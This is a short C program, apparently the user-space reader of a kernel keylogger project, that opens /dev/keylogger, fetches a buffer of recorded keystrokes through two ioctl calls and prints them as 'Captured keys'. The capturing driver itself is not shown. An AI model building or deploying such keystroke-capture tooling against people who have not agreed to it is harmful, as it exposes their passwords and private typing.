#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>

#define DEVICE_PATH "/dev/keylogger"
#define IOCTL_GET_BUFFER_SIZE _IOR('k', 1, int)
#define IOCTL_GET_BUFFER_DATA _IOR('k', 2, char *)

int main()
{
	int fd;
	int buffer_size;
	char *buffer;

	fd = open(DEVICE_PATH, O_RDONLY);
	if (fd < 0) {
		perror("Unable to open keylogger device");
		return errno;
	}

	if (ioctl(fd, IOCTL_GET_BUFFER_SIZE, &buffer_size) < 0) {
		perror("Failed to get buffer size (IOCTL_GET_BUFFER_SIZE)");
		close(fd);
		return errno;
	}

	buffer = (char *)malloc(buffer_size);
	if (!buffer) {
		perror("Failed to allocate memory for buffer");
		close(fd);
		return errno;
	}

	if (ioctl(fd, IOCTL_GET_BUFFER_DATA, buffer) < 0) {
		perror("Failed to get buffer data (IOCTL_GET_BUFFER_DATA)");
		free(buffer);
		close(fd);
		return errno;
	}

	printf("Captured keys: %.*s\n", buffer_size, buffer);

	free(buffer);
	close(fd);

	return 0;
}
